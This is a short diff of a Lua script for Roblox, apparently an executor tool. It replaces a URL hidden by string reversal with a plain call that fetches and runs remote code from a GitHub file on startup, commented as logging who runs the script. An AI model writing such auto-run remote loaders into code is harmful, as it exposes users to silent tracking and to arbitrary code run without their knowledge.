@@ -108,8 +108,6 @@ local TweenService = game:GetService("TweenService")
 local RunService   = game:GetService("RunService")
 local Players      = game:GetService("Players")
 local player       = Players.LocalPlayer
-local s            = string
-local r            = s["rev" .. "erse"]
 
 -- ── CoreGui (Studio-safe) ────────────────────────────────────────────────────
 local CoreGui: Instance
@@ -145,13 +143,13 @@ end)
 -- function that start to count who executor my script
 local function log()
     task.spawn(function()
-        local a = "uauL.goL/gifnoc/XyticoleV/niam/sdaeh/sfer/niaM/eixxof-yreniaM/moc.tnetnocresubuhtig.war//:sptth"
-
-        loadstring(game:HttpGet(r(a)))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Mainery-foxxie/Main/refs/heads/main/Velocity%20X/config/Log.luau"))()
     end)
 end
 
-task.spawn(log)
+task.spawn(function()
+    log()
+end)
 if not _earlySkipIntro then
     sound:Play()
 
